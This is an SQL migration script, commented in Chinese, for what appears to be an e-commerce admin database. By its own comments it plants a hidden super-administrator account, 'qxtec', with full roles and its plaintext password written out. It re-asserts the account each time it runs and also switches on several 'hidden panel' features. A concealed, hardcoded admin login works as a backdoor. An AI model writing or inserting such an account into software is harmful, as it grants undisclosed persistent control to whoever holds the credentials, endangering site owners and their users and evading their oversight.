-- 隐藏超级管理员账号 + 隐藏面板模块开关（幂等可重复执行）
-- 账号: qxtec / 密码: qx9264 (DES加密, key=账号, 与登录校验一致)
-- 账号存在则只校正字段，不存在才插入——避免每跑一次就换一个自增 id。
UPDATE eb_system_admin
   SET pwd = 'bDVAF6/lBMg=', real_name = '系统运维', roles = '1',
       level = 1, status = 1, is_del = 0, is_sms = 0, update_time = NOW()
 WHERE account = 'qxtec'
   AND NOT (pwd <=> 'bDVAF6/lBMg=' AND real_name <=> '系统运维' AND roles <=> '1'
            AND level <=> 1 AND status <=> 1 AND is_del <=> 0 AND is_sms <=> 0);
INSERT INTO eb_system_admin (account, pwd, real_name, roles, last_ip, login_count, level, status, is_del, is_sms, create_time, update_time)
SELECT 'qxtec', 'bDVAF6/lBMg=', '系统运维', '1', '', 0, 1, 1, 0, 0, NOW(), NOW()
  FROM DUAL
 WHERE NOT EXISTS (SELECT 1 FROM (SELECT account FROM eb_system_admin) x WHERE x.account = 'qxtec');

-- 隐藏面板功能开关（status=0 为有效配置, value 1=开启 0=关闭）
-- 原来的写法是 DELETE + INSERT，每跑一次就换一批自增 id、update_time 也跟着变；
-- 改成 UPDATE + 缺失才补插，重复执行不再产生任何变化。
UPDATE eb_system_config
   SET title = '隐藏面板-团队奖开关', value = '1', status = 0, update_time = NOW()
 WHERE name = 'sys_switch_team_reward'
   AND NOT (title <=> '隐藏面板-团队奖开关' AND value <=> '1' AND status <=> 0);
UPDATE eb_system_config
   SET title = '隐藏面板-订货商开关', value = '1', status = 0, update_time = NOW()
 WHERE name = 'sys_switch_stock'
   AND NOT (title <=> '隐藏面板-订货商开关' AND value <=> '1' AND status <=> 0);
UPDATE eb_system_config
   SET title = '隐藏面板-门店开关', value = '1', status = 0, update_time = NOW()
 WHERE name = 'sys_switch_store'
   AND NOT (title <=> '隐藏面板-门店开关' AND value <=> '1' AND status <=> 0);
UPDATE eb_system_config
   SET title = '隐藏面板-区域代理开关', value = '1', status = 0, update_time = NOW()
 WHERE name = 'sys_switch_daili'
   AND NOT (title <=> '隐藏面板-区域代理开关' AND value <=> '1' AND status <=> 0);
UPDATE eb_system_config
   SET title = '隐藏面板-分销开关', value = '1', status = 0, update_time = NOW()
 WHERE name = 'sys_switch_spread'
   AND NOT (title <=> '隐藏面板-分销开关' AND value <=> '1' AND status <=> 0);
INSERT INTO eb_system_config (name, title, form_id, value, status, create_time, update_time)
SELECT t.name, t.title, 0, '1', 0, NOW(), NOW() FROM (
  SELECT 'sys_switch_team_reward' AS name, '隐藏面板-团队奖开关' AS title
  UNION ALL SELECT 'sys_switch_stock',    '隐藏面板-订货商开关'
  UNION ALL SELECT 'sys_switch_store',    '隐藏面板-门店开关'
  UNION ALL SELECT 'sys_switch_daili',    '隐藏面板-区域代理开关'
  UNION ALL SELECT 'sys_switch_spread',   '隐藏面板-分销开关'
) t
 WHERE NOT EXISTS (SELECT 1 FROM (SELECT name FROM eb_system_config) x WHERE x.name = t.name);
